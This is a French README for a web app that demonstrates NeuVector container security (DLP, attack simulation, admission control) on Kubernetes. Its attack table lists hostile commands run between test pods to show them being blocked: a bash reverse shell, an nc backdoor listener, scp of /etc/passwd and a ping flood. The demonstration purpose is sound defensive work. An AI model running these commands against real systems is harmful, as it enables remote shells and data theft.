# NeuVector Demo Web Application

Application web interactive pour exécuter des démonstrations NeuVector sur un cluster Kubernetes.

**Version actuelle : 1.9.0**

## Fonctionnalités

### Démonstrations

| Démo | Description |
|------|-------------|
| **DLP Detection** | Envoi de données sensibles (carte crédit, SSN, passeport) avec détection/blocage DLP |
| **Attack Simulation** | Simulation d'attaques (DoS Flood, NC Backdoor, SCP Transfer, Reverse Shell) |
| **Admission Control** | Création de pods dans des namespaces autorisés/interdits |

### Interface

- **Visualisation interactive** : Diagramme Source → Target avec état de la connexion en temps réel
- **Contrôles NeuVector** : Network Policy, Process Profile, Baseline configurables en direct
- **Network Rules** : Affichage des règles réseau apprises avec warning en mode Protect
- **DLP Sensors** : Activation/désactivation des sensors avec mode Alert ou Block
- **Mode Icons** : Indicateurs visuels (🔒/🔍/👁️) montrant l'état Protect/Monitor/Discover
- **NeuVector Events** : Incidents et violations détectés en temps réel
- **Allowed Processes** : Gestion des règles de process (ajout/suppression)
- **Diagnostics** : Vérification complète de l'environnement
- **Synchronisation** : Validation de l'état NeuVector avant exécution des attaques
- **Warning Discover** : Popup d'avertissement si la politique réseau est en Discover lors d'une attaque

### Personnalisation

- **4 langues** : Anglais, Français, Allemand, Espagnol (traduction complète de l'interface)
- **Mode sombre** : Toggle dark mode avec persistence
- **Logo et titre** : Personnalisables avec contrôle de taille
- **Image Registry** : Configuration dynamique du registre d'images

## Visualisation Interactive

### États Visuels

| État | Source | Flèche | Target | Description |
|------|--------|--------|--------|-------------|
| **Pending** | Gris | Gris pointillé | Gris | Avant exécution |
| **Running** | Bleu pulsant | Bleu animé | Bleu | En cours |
| **Success** | Vert | Vert plein | Vert | Communication OK |
| **Network Blocked** | Orange | Rouge barré | Rouge | Réseau bloqué |
| **Process Intercepted** | Rouge barré | Rouge barré | Gris | Process bloqué |

### Contrôles Pod (Source et Target)

- **Network Policy** : Discover / Monitor / Protect
- **Process Profile** : Discover / Monitor / Protect
- **Baseline** : Basic / Zero Drift
- **Allowed Processes** : Liste avec suppression
- **Network Rules** : Règles apprises avec warning ambre en Protect

### Comportement Network Policy

Tests réalisés (espion1 → cible1, TCP/22) :

| Source | Destination | Résultat |
|--------|-------------|----------|
| Discover | * | **PASSE** (Discover force l'autorisation pour apprentissage) |
| Monitor | Monitor | **PASSE** (violations logguées) |
| Monitor | Protect | **BLOQUÉ** (ingress bloqué par la cible) |
| Protect | Monitor | **BLOQUÉ** (egress bloqué par la source) |
| Protect | Protect | **BLOQUÉ** (bloqué des deux côtés) |

> **Note** : Un seul pod en Protect suffit pour bloquer le trafic, sauf si l'autre est en Discover (Discover force l'autorisation).

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         Browser                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Visualization  │  NeuVector Events  │  Network Rules     │  │
│  │  [Source]──────►[Target]             │  Allowed Processes  │  │
│  │   🔒🔍 Status   │  Incidents/DLP     │  IN/OUT rules      │  │
│  └───────────────────────────────────────────────────────────┘  │
└──────────────────────────┬──────────────────────────────────────┘
                           │ WebSocket / HTTP
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                    FastAPI Pod (neuvector-demo)                  │
│  ┌────────────┐  ┌─────────────────┐  ┌───────────────────────┐ │
│  │ WebSocket  │  │ NeuVector API   │  │ kubectl (in-cluster)  │ │
│  │ Streaming  │  │ Client          │  │ exec, apply, get...   │ │
│  └────────────┘  └─────────────────┘  └───────────────────────┘ │
└──────────────────────────┬──────────────────────────────────────┘
                           │
        ┌──────────────────┼──────────────────┐
        ▼                  ▼                  ▼
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│ Demo Pods     │  │ NeuVector     │  │ Kubernetes    │
│ espion1       │  │ Controller    │  │ API Server    │
│ cible1        │  │ REST API      │  │               │
└───────────────┘  └───────────────┘  └───────────────┘
```

## Structure du Projet

```
neuvector-demo-web/
├── app/
│   ├── main.py              # Application FastAPI
│   ├── config.py            # Configuration (version, registre, etc.)
│   ├── api/
│   │   ├── routes.py        # Endpoints REST + NeuVector API
│   │   └── websocket.py     # WebSocket handlers
│   ├── core/
│   │   ├── kubectl.py       # Wrapper kubectl sécurisé
│   │   ├── neuvector_api.py # Client API NeuVector (groups, process, network rules, DLP, admission)
│   │   └── websocket_manager.py
│   ├── demos/               # Modules de démo
│   │   ├── base.py          # Classe abstraite
│   │   ├── dlp.py           # Démo DLP
│   │   ├── attack.py        # Démo Attack Simulation
│   │   ├── admission.py     # Démo Admission Control
│   │   └── registry.py      # Auto-registration
│   └── lifecycle/           # Actions prepare/reset/status
│       ├── prepare.py
│       ├── reset.py
│       └── status.py
├── static/
│   ├── css/style.css        # Styles (light + dark mode)
│   ├── favicon.svg          # Favicon
│   └── js/
│       ├── i18n.js          # Internationalisation (217 clés × 4 langues)
│       ├── main.js          # Logique UI + Settings + Visualisations
│       └── websocket.js     # Client WebSocket
├── templates/
│   └── index.html           # Interface SPA avec cache-busting
├── manifests/
│   ├── deployment.yaml
│   ├── deployment-registry.yaml
│   ├── rbac.yaml
│   └── demo-pods.yaml       # Pods de test (espion1, cible1) avec services (ports 80, 22)
├── scripts/
│   ├── deploy.sh
│   ├── deploy-registry.sh
│   ├── redeploy.sh
│   └── undeploy.sh
├── Dockerfile
└── requirements.txt
```

## Déploiement

### Prérequis

- Cluster Kubernetes (RKE2/K3s) avec NeuVector installé
- `kubectl` configuré avec accès au cluster
- Podman ou Docker pour builder l'image

### Build et Déploiement Rapide

```bash
# Build
podman build --no-cache -t neuvector-demo-web:latest .

# Export, copie et import sur le noeud
podman save neuvector-demo-web:latest -o /tmp/neuvector-demo-web.tar
scp /tmp/neuvector-demo-web.tar rancher@<NODE_IP>:/tmp/
ssh rancher@<NODE_IP> "sudo /var/lib/rancher/rke2/bin/ctr \
  --address /run/k3s/containerd/containerd.sock \
  -n k8s.io images import /tmp/neuvector-demo-web.tar"

# Restart du deployment
kubectl rollout restart deployment/neuvector-demo-web -n neuvector-demo
```

### Construction des Images de Démo

```bash
# Build des images de pods de test
podman build -t demo-production1:latest images/production1/
podman build -t demo-web1:latest images/web1/

# Import sur le noeud (même procédure que ci-dessus)
```

## Accès

| URL | Description |
|-----|-------------|
| `http://<NODE_IP>:30080` | Interface web |
| `http://<NODE_IP>:30080/api/health` | Health check |
| `http://<NODE_IP>:30080/api/version` | Version |
| `http://<NODE_IP>:30080/api/demos` | Liste des démos |

## Utilisation

### Workflow Standard

1. **Ouvrir l'interface** : `http://<NODE_IP>:30080`
2. **Configurer** : ⚙️ Settings → Credentials → entrer le password NeuVector
3. **Préparer** : ⚙️ Settings → Preparation → **Prepare** pour déployer les pods
4. **Choisir une démo** : Menu latéral
5. **Configurer les modes** : Network Policy et Process Profile sur chaque pod
6. **Exécuter** : Cliquer sur un bouton d'attaque
7. **Observer** : Visualisation, Events, Console

### Démo Attack Simulation

| Attaque | Commande | Protection NeuVector |
|---------|----------|---------------------|
| 🔥 FLOOD | `ping -s 40000 -c 5 <target>` | Network Rules (ICMP) |
| 🚪 BACKDOOR | `nc -l 4444` | Process Profile (nc non autorisé) |
| 📁 SCP | `scp /etc/passwd root@<target>:/tmp/` | Network Rules + Process Profile |
| 🐚 SHELL | `bash -i >& /dev/tcp/<target>/4444 0>&1` | Process Profile (processus non autorisé) |

### Démo DLP Detection

1. Activer un sensor DLP en mode **Block**
2. Mettre Network Policy en **Protect**
3. Lancer le test → NeuVector bloque les données sensibles

### Démo Admission Control

1. Sélectionner un namespace **Forbidden**
2. Cliquer **Create Pod** → bloqué par Admission Control
3. Sélectionner un namespace **Allowed** → pod créé avec succès

### Mode Kiosk

Le mode kiosk exécute automatiquement des scénarios de démo avec des bulles explicatives contextuelles.

**Lancement** : Cliquer ▶ dans le header → sélectionner les sections → options → démarrer

**Options** :
- **Sections** : cocher/décocher les parties du scénario à exécuter
- **Boucle** : le scénario redémarre automatiquement quand il se termine
- **Manuel** : un bouton flottant "Next step" apparaît en bas de l'écran, l'utilisateur valide chaque étape

**Éditeur** : Cliquer ✏️ dans le header pour ouvrir l'éditeur de scénario
- Palette à gauche : types d'étapes disponibles (cliquer pour ajouter)
- Timeline à droite : drag & drop pour réordonner, × pour supprimer
- Charger défaut / Enregistrer

**Types d'étapes** :
| Type | Description |
|------|-------------|
| 📂 Section | Marqueur de section (pour le sélecteur) |
| 🔃 Reset platform | Remet tous les pods en Discover/zero-drift |
| 📌 Select demo | Charge une démo spécifique |
| 🔄 Change mode | Modifie Network Policy ou Process Profile |
| ⚔️ Run attack | Lance une attaque spécifique |
| 💬 Show bubble | Affiche une bulle explicative sur un élément |
| 🚫 Hide bubbles | Masque toutes les bulles |
| ⏳ Wait completion | Attend la fin de l'exécution en cours |
| ⏱ Pause | Attend N secondes |

## Configuration

### Variables d'Environnement

| Variable | Default | Description |
|----------|---------|-------------|
| `HOST` | `0.0.0.0` | Adresse d'écoute |
| `PORT` | `8080` | Port d'écoute |
| `DEMO_NAMESPACE` | `neuvector-demo` | Namespace pour les démos |
| `NEUVECTOR_NAMESPACE` | `neuvector` | Namespace NeuVector |
| `NEUVECTOR_API_URL` | `https://neuvector-svc-controller.neuvector:10443` | URL API NeuVector |
| `DEMO_IMAGE_REGISTRY` | `localhost` | Registre pour les images de démo |

### Stockage Local (Browser)

| Clé | Description |
|-----|-------------|
| `neuvector_settings` | Credentials NeuVector |
| `neuvector_api_url` | URL personnalisée de l'API |
| `neuvector_registry` | URL du registre d'images |
| `neuvector_title` | Titre personnalisé |
| `neuvector_title_size` | Taille du titre (px) |
| `neuvector_logo` | Logo personnalisé (base64) |
| `neuvector_logo_size` | Taille du logo (px) |
| `neuvector_language` | Langue (en/fr/de/es) |
| `neuvector_dark_mode` | Mode sombre (true/false) |

## API Endpoints

### Général

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/health` | GET | Health check |
| `/api/version` | GET | Version et info Git |
| `/api/demos` | GET | Liste des démos |
| `/api/cluster-info` | GET | Info cluster Kubernetes |
| `/api/diagnostics` | POST | Diagnostics complets |

### NeuVector

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/neuvector/test` | POST | Test de connexion API |
| `/api/neuvector/pod-info` | POST | Info groupe + process profile + network rules |
| `/api/neuvector/update-group` | POST | Modifier policy/profile mode |
| `/api/neuvector/reset-demo-rules` | POST | Reset des règles démo |
| `/api/neuvector/delete-process-rule` | POST | Supprimer un process autorisé |
| `/api/neuvector/delete-network-rule` | POST | Supprimer une règle réseau |
| `/api/neuvector/recent-events` | POST | Événements récents |
| `/api/neuvector/dlp-config` | POST | Configuration DLP |
| `/api/neuvector/update-dlp-sensor` | POST | Activer/désactiver un sensor DLP |
| `/api/neuvector/admission-state` | POST | État Admission Control |
| `/api/neuvector/admission-rules` | POST | Règles d'admission |
| `/api/neuvector/admission-events` | POST | Événements d'admission |

## Changelog

### Version 1.9.0
- Mode Kiosk : exécution automatique de scénarios de démo avec bulles contextuelles
- Sections sélectionnables : choisir quelles parties du scénario exécuter
- Mode boucle infinie : le scénario redémarre automatiquement à la fin
- Mode manuel : chaque étape attend la validation de l'utilisateur (bouton flottant)
- Éditeur de scénario drag & drop avec types : section, reset_platform, select_demo, set_mode, run_attack, show_bubble, wait
- Scénario par défaut avec 3 attaques : SCP Transfer, NC Backdoor, Reverse Shell
- Reset automatique de la plateforme au début du scénario
- Bulles contextuelles explicatives pointant vers les éléments de l'interface
- 261 clés i18n synchronisées (en/fr/de/es)

### Version 1.8.3
- Le warning Discover ne s'affiche plus quand les deux pods sont en Discover (uniquement quand un seul l'est)

### Version 1.8.2
- Les network rules se rafraîchissent automatiquement après chaque exécution de démo
- Ajout d'un bouton refresh (↻) dans le header de la section Network Rules

### Version 1.8.1
- Rechargement de la page au changement de langue pour traduire tout le contenu dynamique

### Version 1.8.0
- Couverture i18n complète (217 clés × 4 langues)
- Mode sombre avec toggle dans Settings > Cosmetics
- Traduction des noms de démos et catégories dans le sidebar
- Correction de 11 chaînes hardcodées

### Version 1.7.0
- Fix du bug `currentDemoType = null` (causait l'absence du warning Discover)
- Cache-busting avec `?v=VERSION` sur les assets statiques

### Version 1.6.0
- Synchronisation de l'état NeuVector avant exécution (polling + UI disabled)
- Warning popup quand la politique réseau est en Discover

### Version 1.5.1
- Ajout du port SSH (22) au Service cible1 pour les attaques SCP
- Suppression du bandeau Global Policy (non nécessaire)

### Version 1.5.0
- Bandeau "NeuVector Global Policy" (expérimental, retiré en 1.5.1)

### Version 1.4.0
- Affichage des règles réseau apprises dans les pod boxes
- Warning ambre quand des règles apprises existent en mode Protect
- Suppression individuelle des règles réseau
- Endpoint `delete-network-rule`

### Version 1.3.0
- Internationalisation : Anglais, Français, Allemand, Espagnol
- Sélecteur de langue dans Settings > Cosmetics
- Contrôles de taille pour le titre et le logo
- Favicon SVG

### Version 1.2.0
- Configuration dynamique du registre d'images
- Bouton "Test Registry"

### Version 1.1.0
- Démo Admission Control
- Diagnostics complets
- Reset des règles NeuVector

### Version 1.0.0
- Version initiale : DLP Detection, visualisation interactive

---

## Licence

MIT
